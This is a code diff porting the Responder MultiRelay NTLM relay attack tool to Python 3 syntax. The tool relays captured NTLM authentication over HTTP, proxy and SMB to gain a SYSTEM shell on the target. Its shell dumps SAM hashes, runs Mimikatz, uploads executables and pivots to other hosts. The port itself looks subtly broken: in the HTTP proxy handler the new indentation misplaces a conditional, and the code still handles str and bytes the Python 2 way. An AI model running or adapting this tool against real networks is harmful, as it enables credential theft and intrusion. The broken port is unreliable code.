@@ -23,17 +23,17 @@ import time
 import random
 import subprocess
 from threading import Thread
-from SocketServer import TCPServer, UDPServer, ThreadingMixIn, BaseRequestHandler
+from socketserver import TCPServer, UDPServer, ThreadingMixIn, BaseRequestHandler
 try:
     from Crypto.Hash import MD5
 except ImportError:
-    print "\033[1;31m\nCrypto lib is not installed. You won't be able to live dump the hashes."
-    print "You can install it on debian based os with this command: apt-get install python-crypto"
-    print "The Sam file will be saved anyway and you will have the bootkey.\033[0m\n"
+    print ("\033[1;31m\nCrypto lib is not installed. You won't be able to live dump the hashes.")
+    print ("You can install it on debian based os with this command: apt-get install python-crypto")
+    print ("The Sam file will be saved anyway and you will have the bootkey.\033[0m\n")
 try:
     import readline
 except:
-    print "Warning: readline module is not available, you will not be able to use the arrow keys for command history"
+    print ("Warning: readline module is not available, you will not be able to use the arrow keys for command history")
     pass
 from MultiRelay.RelayMultiPackets import *
 from MultiRelay.RelayMultiCore import *
@@ -72,18 +72,18 @@ parser.add_option('-d', '--dump', action="store_true", help="Dump hashes (script
 options, args = parser.parse_args()
 
 if options.TARGET is None:
-    print "\n-t Mandatory option is missing, please provide a target.\n"
+    print ("\n-t Mandatory option is missing, please provide a target.\n")
     parser.print_help()
     exit(-1)
 if options.UserToRelay is None:
-    print "\n-u Mandatory option is missing, please provide a username to relay.\n"
+    print ("\n-u Mandatory option is missing, please provide a username to relay.\n")
     parser.print_help()
     exit(-1)
 if options.ExtraPort is None:
     options.ExtraPort = 0
 
 if not os.geteuid() == 0:
-    print color("[!] MultiRelay must be run as root.")
+    print (color("[!] MultiRelay must be run as root."))
     sys.exit(-1)
 
 OneCommand       = options.OneCommand
@@ -98,46 +98,46 @@ Pivoting         = [2]
 
 
 def color(txt, code = 1, modifier = 0):
-	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)
+     return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)
 
 def ShowWelcome():
-     print color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1)
-     print '\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com'
-     print 'Usernames to relay (-u) are case sensitive.'
-     print 'To kill this script hit CTRL-C.\n'
-     print color('/*',8,1)
-     print 'Use this script in combination with Responder.py for best results.'
-     print 'Make sure to set SMB and HTTP to OFF in Responder.conf.\n'
-     print 'This tool listen on TCP port 80, 3128 and 445.'
-     print 'For optimal pwnage, launch Responder only with these 2 options:'
-     print '-rv\nAvoid running a command that will likely prompt for information like net use, etc.'
-     print 'If you do so, use taskkill (as system) to kill the process.'
-     print color('*/',8,1)
-     print color('\nRelaying credentials for these users:',8,1)
-     print color(UserToRelay,4,1)
-     print '\n'
+     print (color('\nResponder MultiRelay %s NTLMv1/2 Relay' %(__version__),8,1))
+     print ('\nSend bugs/hugs/comments to: laurent.gaffie@gmail.com')
+     print ('Usernames to relay (-u) are case sensitive.')
+     print ('To kill this script hit CTRL-C.\n')
+     print (color('/*',8,1))
+     print ('Use this script in combination with Responder.py for best results.')
+     print ('Make sure to set SMB and HTTP to OFF in Responder.conf.\n')
+     print ('This tool listen on TCP port 80, 3128 and 445.')
+     print ('For optimal pwnage, launch Responder only with these 2 options:')
+     print ('-rv\nAvoid running a command that will likely prompt for information like net use, etc.')
+     print ('If you do so, use taskkill (as system) to kill the process.')
+     print (color('*/',8,1))
+     print (color('\nRelaying credentials for these users:',8,1))
+     print (color(UserToRelay,4,1))
+     print ('\n')
 
 
 ShowWelcome()
 
 def ShowHelp():
-     print color('Available commands:',8,0)
-     print color('dump',8,1)+'               -> Extract the SAM database and print hashes.'
-     print color('regdump KEY',8,1)+'        -> Dump an HKLM registry key (eg: regdump SYSTEM)'
-     print color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)'
-     print color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)'
-     print color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)'
-     print color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\'
-     print color('runas  Command',8,1)+'     -> Run a command as the currently logged in user. (eg: runas whoami)'
-     print color('scan /24',8,1)+'           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to'
-     print color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)'
-     print color('mimi  command',8,1)+'      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)'
-     print color('mimi32  command',8,1)+'    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)'
-     print color('lcmd  command',8,1)+'      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)'
-     print color('help',8,1)+'               -> Print this message.'
-     print color('exit',8,1)+'               -> Exit this shell and return in relay mode.'
-     print '                      If you want to quit type exit and then use CTRL-C\n'
-     print color('Any other command than that will be run as SYSTEM on the target.\n',8,1)
+     print (color('Available commands:',8,0))
+     print (color('dump',8,1)+'               -> Extract the SAM database and print hashes.')
+     print (color('regdump KEY',8,1)+'        -> Dump an HKLM registry key (eg: regdump SYSTEM)')
+     print (color('read Path_To_File',8,1)+'  -> Read a file (eg: read /windows/win.ini)')
+     print (color('get  Path_To_File',8,1)+'  -> Download a file (eg: get users/administrator/desktop/password.txt)')
+     print (color('delete Path_To_File',8,1)+'-> Delete a file (eg: delete /windows/temp/executable.exe)')
+     print (color('upload Path_To_File',8,1)+'-> Upload a local file (eg: upload /home/user/bk.exe), files will be uploaded in \\windows\\temp\\')
+     print (color('runas  Command',8,1)+'     -> Run a command as the currently logged in user. (eg: runas whoami)')
+     print (color('scan /24',8,1)+'           -> Scan (Using SMB) this /24 or /16 to find hosts to pivot to')
+     print (color('pivot  IP address',8,1)+'  -> Connect to another host (eg: pivot 10.0.0.12)')
+     print (color('mimi  command',8,1)+'      -> Run a remote Mimikatz 64 bits command (eg: mimi coffee)')
+     print (color('mimi32  command',8,1)+'    -> Run a remote Mimikatz 32 bits command (eg: mimi coffee)')
+     print (color('lcmd  command',8,1)+'      -> Run a local command and display the result in MultiRelay shell (eg: lcmd ifconfig)')
+     print (color('help',8,1)+'               -> Print this message.')
+     print (color('exit',8,1)+'               -> Exit this shell and return in relay mode.')
+     print ('                      If you want to quit type exit and then use CTRL-C\n')
+     print (color('Any other command than that will be run as SYSTEM on the target.\n',8,1))
 
 Logs_Path = os.path.abspath(os.path.join(os.path.dirname(__file__)))+"/../"
 Logs = logging
@@ -153,7 +153,7 @@ def UploadContent(File):
 try:
     RunFinger(Host[0])
 except:
-    print "The host %s seems to be down or port 445 down."%(Host[0])
+    print ("The host %s seems to be down or port 445 down."%(Host[0]))
     sys.exit(1)
 
 
@@ -190,7 +190,7 @@ def ConnectToTarget():
         except:
             try:
                 sys.exit(1)
-                print "Cannot connect to target, host down?"
+                print ("Cannot connect to target, host down?")
             except:
                 pass
 
@@ -219,45 +219,45 @@ class HTTPProxyRelay(BaseRequestHandler):
 
             NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
             ##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
-	    if NTLM_Auth:
+            if NTLM_Auth:
                 #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
-	        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
+                Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
 
-		if Packet_NTLM == "\x01":
-                    ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
-                    h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
-                    n = SMBNegoCairo(Data = SMBNegoCairoData())
-                    n.calculate()
-                    packet0 = str(h)+str(n)
-                    buffer0 = longueur(packet0)+packet0
-                    s.send(buffer0)
-                    smbdata = s.recv(2048)
-                    ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
-                    if smbdata[8:10] == "\x72\x00":
-                        head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
-                        t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
-                        t.calculate()
-                        packet1 = str(head)+str(t)
-                        buffer1 = longueur(packet1)+packet1
-                        s.send(buffer1)
-                        smbdata = s.recv(2048) #got it here.
+            if Packet_NTLM == "\x01":
+                ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
+                h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
+                n = SMBNegoCairo(Data = SMBNegoCairoData())
+                n.calculate()
+                packet0 = str(h)+str(n)
+                buffer0 = longueur(packet0)+packet0
+                s.send(buffer0)
+                smbdata = s.recv(2048)
+                ##Session Setup AndX Request, NTLMSSP_NEGOTIATE
+                if smbdata[8:10] == "\x72\x00":
+                    head = SMBHeader(cmd="\x73",flag1="\x18", flag2="\x43\xc8",mid="\x02\x00")
+                    t = SMBSessionSetupAndxNEGO(Data=b64decode(''.join(NTLM_Auth)))#
+                    t.calculate()
+                    packet1 = str(head)+str(t)
+                    buffer1 = longueur(packet1)+packet1
+                    s.send(buffer1)
+                    smbdata = s.recv(2048) #got it here.
 
                     ## Send HTTP Proxy
-	            Buffer_Ans = WPAD_NTLM_Challenge_Ans()
-		    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
+                    Buffer_Ans = WPAD_NTLM_Challenge_Ans()
+                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                     key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
-		    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
+                    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
                     data = self.request.recv(8092)
                     NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                     Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
 
                     ##Got NTLM Message 3 from client.
-		    if Packet_NTLM == "\x03":
-	                NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
+                    if Packet_NTLM == "\x03":
+                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                         ##Might be anonymous, verify it and if so, send no go to client.
                         if IsSMBAnonymous(NTLM_Auth):
                             Response = WPAD_Auth_407_Ans()
-	                    self.request.send(str(Response))
+                            self.request.send(str(Response))
                             data = self.request.recv(8092)
                         else:
                             #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
@@ -270,24 +270,24 @@ class HTTPProxyRelay(BaseRequestHandler):
                                 t.calculate()
                                 packet1 = str(head)+str(t)
                                 buffer1 = longueur(packet1)+packet1
-                                print "[+] SMB Session Auth sent."
+                                print ("[+] SMB Session Auth sent.")
                                 s.send(buffer1)
                                 smbdata = s.recv(2048)
-   	                        RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
+                                RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                                 if RunCmd is None:
                                    s.close()
-	                           self.request.close()
+                                   self.request.close()
                                    return None
 
-	    else:
+            else:
                 ##Any other type of request, send a 407.
                 Response = WPAD_Auth_407_Ans()
-	        self.request.send(str(Response))
+                self.request.send(str(Response))
 
         except Exception:
-	    self.request.close()
+            self.request.close()
             ##No need to print anything (timeouts, rst, etc) to the user console..
-	    pass
+            pass
 
 
 class HTTPRelay(BaseRequestHandler):
@@ -316,11 +316,11 @@ class HTTPRelay(BaseRequestHandler):
 
             NTLM_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
             ##Make sure incoming packet is an NTLM auth, if not send HTTP 407.
-	    if NTLM_Auth:
+            if NTLM_Auth:
                 #Get NTLM Message code. (1:negotiate, 2:challenge, 3:auth)
-	        Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
+                Packet_NTLM = b64decode(''.join(NTLM_Auth))[8:9]
 
-		if Packet_NTLM == "\x01":
+                if Packet_NTLM == "\x01":
                     ## SMB Block. Once we get an incoming NTLM request, we grab the ntlm challenge from the target.
                     h = SMBHeader(cmd="\x72",flag1="\x18", flag2="\x43\xc8")
                     n = SMBNegoCairo(Data = SMBNegoCairoData())
@@ -340,21 +340,21 @@ class HTTPRelay(BaseRequestHandler):
                         smbdata = s.recv(2048) #got it here.
 
                     ## Send HTTP Response.
-	            Buffer_Ans = IIS_NTLM_Challenge_Ans()
-		    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
+                    Buffer_Ans = IIS_NTLM_Challenge_Ans()
+                    Buffer_Ans.calculate(str(ExtractRawNTLMPacket(smbdata)))#Retrieve challenge message from smb
                     key = ExtractHTTPChallenge(smbdata,Pivoting)#Grab challenge key for later use (hash parsing).
-		    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
+                    self.request.send(str(Buffer_Ans)) #We send NTLM message 2 to the client.
                     data = self.request.recv(8092)
                     NTLM_Proxy_Auth = re.findall(r'(?<=Authorization: NTLM )[^\r]*', data)
                     Packet_NTLM = b64decode(''.join(NTLM_Proxy_Auth))[8:9]
 
                     ##Got NTLM Message 3 from client.
-		    if Packet_NTLM == "\x03":
-	                NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
+                    if Packet_NTLM == "\x03":
+                        NTLM_Auth = b64decode(''.join(NTLM_Proxy_Auth))
                         ##Might be anonymous, verify it and if so, send no go to client.
                         if IsSMBAnonymous(NTLM_Auth):
                             Response = IIS_Auth_401_Ans()
-	                    self.request.send(str(Response))
+                            self.request.send(str(Response))
                             data = self.request.recv(8092)
                         else:
                             #Let's send that NTLM auth message to ParseSMBHash which will make sure this user is allowed to login
@@ -367,25 +367,25 @@ class HTTPRelay(BaseRequestHandler):
                                 t.calculate()
                                 packet1 = str(head)+str(t)
                                 buffer1 = longueur(packet1)+packet1
-                                print "[+] SMB Session Auth sent."
+                                print ("[+] SMB Session Auth sent.")
                                 s.send(buffer1)
                                 smbdata = s.recv(2048)
-   	                        RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
+                                RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                                 if RunCmd is None:
                                    s.close()
-	                           self.request.close()
+                                   self.request.close()
                                    return None
 
-	    else:
+            else:
                 ##Any other type of request, send a 401.
                 Response = IIS_Auth_401_Ans()
-	        self.request.send(str(Response))
+                self.request.send(str(Response))
 
 
         except Exception:
-	    self.request.close()
+            self.request.close()
             ##No need to print anything (timeouts, rst, etc) to the user console..
-	    pass
+            pass
 
 class SMBRelay(BaseRequestHandler):
 
@@ -456,11 +456,11 @@ class SMBRelay(BaseRequestHandler):
                     if Pivoting[0] == "1":
                        pass
                     else:
-                       print "[+] SMB Session Auth sent."
+                       print ("[+] SMB Session Auth sent.")
                     s.send(buffer1)
                     smbdata = s.recv(4096)
                     #We're all set, dropping into shell.
-   	            RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
+                    RunCmd = RunShellCmd(smbdata, s, self.client_address[0], Host, Username, Domain)
                     #If runcmd is None it's because tree connect was denied for this user.
                     #This will only happen once with that specific user account.
                     #Let's kill that connection so we can force him to reauth with another account.
@@ -480,9 +480,9 @@ class SMBRelay(BaseRequestHandler):
                    return None
 
         except Exception:
-	    self.request.close()
+            self.request.close()
             ##No need to print anything (timeouts, rst, etc) to the user console..
-	    pass
+            pass
 
 
 #Interface starts here.
@@ -499,20 +499,20 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
 
     # On this block we do some verifications before dropping the user into the shell.
     if data[8:10] == "\x73\x6d":
-        print "[+] Relay failed, Logon Failure. This user doesn't have an account on this target."
-        print "[+] Hashes were saved anyways in Responder/logs/ folder.\n"
+        print ("[+] Relay failed, Logon Failure. This user doesn't have an account on this target.")
+        print ("[+] Hashes were saved anyways in Responder/logs/ folder.\n")
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Target[0]+":Logon Failure")
         del ShellOpen[:]
         return False
 
     if data[8:10] == "\x73\x8d":
-        print "[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n"
+        print ("[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.\n")
         Logs.info(clientIP+":"+Username+":"+Domain+":"+Target[0]+":Logon Failure")
         del ShellOpen[:]
         return False
 
     if data[8:10] == "\x73\x5e":
-        print "[+] Relay failed, NO_LOGON_SERVER returned. Credentials are probably good, but the PDC is either offline or inexistant.\n"
+        print ("[+] Relay failed, NO_LOGON_SERVER returned. Credentials are probably good, but the PDC is either offline or inexistant.\n")
         del ShellOpen[:]
         return False
 
@@ -533,14 +533,14 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
         if Pivoting[0] == "1":
            pass
         else:
-           print "[+] Relay Failed, Tree Connect AndX denied. This is a low privileged user or SMB Signing is mandatory.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n"
+           print ("[+] Relay Failed, Tree Connect AndX denied. This is a low privileged user or SMB Signing is mandatory.\n[+] Hashes were saved anyways in Responder/logs/ folder.\n")
            Logs.info(clientIP+":"+Username+":"+Domain+":"+Target[0]+":Logon Failure")
         del ShellOpen[:]
         return False
 
     # This one should not happen since we always use the IP address of the target in our tree connects, but just in case..
     if data[8:10] == "\x75\xcc":
-        print "[+] Tree Connect AndX denied. Bad Network Name returned."
+        print ("[+] Tree Connect AndX denied. Bad Network Name returned.")
         del ShellOpen[:]
         return False
 
@@ -549,7 +549,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
         if Pivoting[0] == "1":
            pass
         else:
-           print "[+] Looks good, "+Username+" has admin rights on C$."
+           print ("[+] Looks good, "+Username+" has admin rights on C$.")
         head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
         t = SMBTreeConnectData(Path="\\\\"+Target[0]+"\\IPC$")
         t.calculate()
@@ -560,12 +560,12 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
 
     ## Run one command.
     if data[8:10] == "\x75\x00" and OneCommand != None or Dump:
-        print "[+] Authenticated."
+        print ("[+] Authenticated.")
         if OneCommand != None:
-           print "[+] Running command: %s"%(OneCommand)
+           print ("[+] Running command: %s"%(OneCommand))
            RunCmd(data, s, clientIP, Username, Domain, OneCommand, Logs, Target[0])
         if Dump:
-           print "[+] Dumping hashes"
+           print ("[+] Dumping hashes")
            DumpHashes(data, s, Target[0])
         os._exit(1)
 
@@ -574,10 +574,10 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
         if Pivoting[0] == "1":
            pass
         else:
-           print "[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n"
+           print ("[+] Authenticated.\n[+] Dropping into Responder's interactive shell, type \"exit\" to terminate\n")
            ShowHelp()
         Logs.info("Client:"+clientIP+", "+Domain+"\\"+Username+" --> Target: "+Target[0]+" -> Shell acquired")
-        print color('Connected to %s as LocalSystem.'%(Target[0]),2,1)
+        print (color('Connected to %s as LocalSystem.'%(Target[0]),2,1))
 
     while True:
 
@@ -617,7 +617,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
             Help    = re.findall('^help', Cmd[0])
 
             if Cmd[0] == "exit":
-               print "[+] Returning in relay mode."
+               print ("[+] Returning in relay mode.")
                del Cmd[:]
                del ShellOpen[:]
                return None
@@ -647,7 +647,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                   data = WriteFile(data, s, File,  FileSize, FileContent, Target[0])
                   del Cmd[:]
                else:
-                  print File+" does not exist, please specify a valid file."
+                  print (File+" does not exist, please specify a valid file.")
                   del Cmd[:]
 
             if Delete:
@@ -669,7 +669,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                   data = RunAsCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0], FileName)
                   del Cmd[:]
                else:
-                  print RunAsFileName+" does not exist, please specify a valid file."
+                  print (RunAsFileName+" does not exist, please specify a valid file.")
                   del Cmd[:]
 
             if LCmd:
@@ -685,7 +685,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                   data = RunMimiCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0],FileName)
                   del Cmd[:]
                else:
-                  print MimikatzFilename+" does not exist, please specify a valid file."
+                  print (MimikatzFilename+" does not exist, please specify a valid file.")
                   del Cmd[:]
 
             if Mimi32:
@@ -697,12 +697,12 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                   data = RunMimiCmd(data, s, clientIP, Username, Domain, Exec, Logs, Target[0],FileName)
                   del Cmd[:]
                else:
-                  print Mimikatzx86Filename+" does not exist, please specify a valid file."
+                  print (Mimikatzx86Filename+" does not exist, please specify a valid file.")
                   del Cmd[:]
 
             if Pivot:
                if Pivot[0] == Target[0]:
-                  print "[Pivot Verification Failed]: You're already on this host. No need to pivot."
+                  print ("[Pivot Verification Failed]: You're already on this host. No need to pivot.")
                   del Pivot[:]
                   del Cmd[:]
                else:
@@ -718,7 +718,7 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                         Status, data = VerifyPivot(data, s, clientIP, Username, Domain, Pivot[0], Logs, Target[0], RunAsPath, FileName)
 
                         if Status == True:
-                           print "[+] Pivoting to %s."%(Pivot[0])
+                           print ("[+] Pivoting to %s."%(Pivot[0]))
                            if os.path.isfile(RunAsFileName):
                               FileSize, FileContent = UploadContent(RunAsFileName)
                               data = WriteFile(data, s, FileName,  FileSize, FileContent, Target[0])
@@ -734,11 +734,11 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                               return None
 
                         if Status == False:
-                           print "[Pivot Verification Failed]: This user doesn't have enough privileges on "+Pivot[0]+" to pivot. Try another host."
+                           print ("[Pivot Verification Failed]: This user doesn't have enough privileges on "+Pivot[0]+" to pivot. Try another host.")
                            del Cmd[:]
                            del Pivot[:]
                      else:
-                        print RunAsFileName+" does not exist, please specify a valid file."
+                        print (RunAsFileName+" does not exist, please specify a valid file.")
                         del Cmd[:]
 
             if Scan:
@@ -762,11 +762,11 @@ def RunShellCmd(data, s, clientIP, Target, Username, Domain):
                       data = RunCmd(data, s, clientIP, Username, Domain, Cmd[0], Logs, Target[0], RunPath,FileName)
                       del Cmd[:]
                    else:
-                      print SysSVCFileName+" does not exist, please specify a valid file."
+                      print (SysSVCFileName+" does not exist, please specify a valid file.")
                       del Cmd[:]
 
         if data is None:
-           print "\033[1;31m\nSomething went wrong, the server dropped the connection.\nMake sure (\\Windows\\Temp\\) is clean on the server\033[0m\n"
+           print ("\033[1;31m\nSomething went wrong, the server dropped the connection.\nMake sure (\\Windows\\Temp\\) is clean on the server\033[0m\n")
 
         if data[8:10] == "\x2d\x34":#We confirmed with OpenAndX that no file remains after the execution of the last command. We send a tree connect IPC and land at the begining of the command loop.
             head = SMBHeader(cmd="\x75",flag1="\x18", flag2="\x07\xc8",mid="\x04\x00",pid=data[30:32],uid=data[32:34],tid=data[28:30])
@@ -789,7 +789,7 @@ def serve_thread_tcp(host, port, handler):
           server = ThreadingTCPServer((host, port), handler)
           server.serve_forever()
      except:
-          print color('Error starting TCP server on port '+str(port)+ ', check permissions or other servers running.', 1, 1)
+          print (color('Error starting TCP server on port '+str(port)+ ', check permissions or other servers running.', 1, 1))
 
 def main():
      try:
